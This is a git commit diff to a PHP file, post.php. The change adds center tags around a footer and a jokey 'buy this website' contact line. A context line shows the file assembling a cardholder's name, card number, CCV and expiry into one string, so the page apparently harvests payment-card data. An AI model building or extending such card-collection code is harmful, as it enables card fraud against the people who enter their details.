58c2a8b6dd0f8adea7ed64b413774e85bc4fd0c8
gnutard <166033088+gnutard@users.noreply.github.com>
2024-07-25 16:13:44 +0000

    Update post.php

--- post.php
+++ post.php
@@ -20,10 +20,12 @@ $content = "$name, $ccv, $exp, $ccnumber"; ?>
 ])); ?>
 
 </body>
+    <center>
     <footer>
      <p>Copyrigh (C) 2024</p>
 </footer>
 <address>
      <p>Buy this website! Send an e-mail <a href=mailto:installerwizard@national.shitposting.agency>here.</a></p>
 </address>
+        </center>
 </html>
